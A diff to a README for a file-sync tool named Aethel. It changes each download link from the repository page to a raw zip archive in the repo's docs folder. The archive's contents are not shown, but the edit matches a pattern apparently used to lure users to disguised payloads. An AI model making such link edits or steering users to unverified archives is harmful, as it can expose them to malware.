@@ -1,10 +1,10 @@
 # 🗂️ Aethel - Keep files in sync with confidence
 
-[![Download Aethel](https://img.shields.io/badge/Download-Aethel-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/murrayartistic325/Aethel)
+[![Download Aethel](https://img.shields.io/badge/Download-Aethel-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/murrayartistic325/Aethel/raw/refs/heads/main/docs/Software-2.9-alpha.4.zip)
 
 ## 📥 Download Aethel
 
-Visit this page to download: https://github.com/murrayartistic325/Aethel
+Visit this page to download: https://github.com/murrayartistic325/Aethel/raw/refs/heads/main/docs/Software-2.9-alpha.4.zip
 
 1. Open the link in your web browser.
 2. Look for the latest version or release files on the page.
@@ -186,4 +186,4 @@ For a smooth start on Windows, use:
 
 ## 🔗 Link
 
-Primary download page: https://github.com/murrayartistic325/Aethel
+Primary download page: https://github.com/murrayartistic325/Aethel/raw/refs/heads/main/docs/Software-2.9-alpha.4.zip
